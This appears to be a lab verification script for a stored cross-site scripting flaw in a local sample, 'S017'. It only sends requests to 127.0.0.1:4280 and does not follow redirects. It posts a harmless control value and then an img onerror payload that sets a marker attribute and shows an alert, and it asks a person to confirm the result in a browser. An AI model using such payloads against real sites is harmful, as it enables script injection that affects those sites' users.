#!/usr/bin/env python3
import argparse
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOST = "127.0.0.1"
ALLOWED_PORT = 4280


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def validate_url(raw: str) -> str:
    try:
        parsed = urllib.parse.urlsplit(raw)
        port = parsed.port
    except ValueError as exc:
        raise SystemExit(f"URL 端口无效: {exc}")
    if parsed.scheme != "http":
        raise SystemExit("目标必须使用 http://")
    if parsed.hostname != ALLOWED_HOST or port != ALLOWED_PORT:
        raise SystemExit("目标必须固定为 http://127.0.0.1:4280/ 下的地址")
    if parsed.username or parsed.password:
        raise SystemExit("目标 URL 不允许包含用户名或密码")
    return raw


def send(url: str, data: bytes | None = None):
    headers = {"User-Agent": "S017-local-xss-check"}
    method = "GET"
    if data is not None:
        method = "POST"
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(req, timeout=10) as resp:
            body = resp.read().decode("utf-8", "replace")
            return resp.status, body
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace")
        return exc.code, body


def main() -> int:
    parser = argparse.ArgumentParser(
        description="S017 本地存储型 XSS 验证脚本：只访问 127.0.0.1:4280，不跟随重定向。"
    )
    parser.add_argument(
        "--url",
        required=True,
        help="当前样本 index.php 的实际本地 URL，例如 http://127.0.0.1:4280/实际路径/index.php",
    )
    args = parser.parse_args()
    url = validate_url(args.url)

    ordinary = "S017 普通对照：无脚本标记"
    payload = (
        "<img src=x onerror=\"document.body.setAttribute('data-s017','XSS_CONFIRMED');"
        "alert('S017_XSS_CONFIRMED')\">"
    )

    status, _ = send(url, urllib.parse.urlencode({"body": ordinary}).encode("utf-8"))
    print(f"普通写入 POST 状态: {status}")

    status, _ = send(url, urllib.parse.urlencode({"body": payload}).encode("utf-8"))
    print(f"测试写入 POST 状态: {status}")

    status, body = send(url)
    print(f"持久化后独立读取 GET 状态: {status}")
    print("响应体中是否出现测试载荷字符串（仅脚本观察，不等于浏览器执行）:", payload in body)
    print(f"请人工在浏览器打开并观察: {url}")
    print("普通对照预期：显示普通文本，无弹窗，无 data-s017 标记。")
    print("测试预期：应出现 alert('S017_XSS_CONFIRMED') 或 body 的 data-s017=XSS_CONFIRMED。")
    print("若浏览器未实际出现上述标记/弹窗，则不能判断漏洞已触发。")
    print("清理：由实验环境管理员按 sample_id='S017' 和上述普通/测试 body 内容清理数据库记录；本脚本不执行删除。")
    return 0


if __name__ == "__main__":
    sys.exit(main())
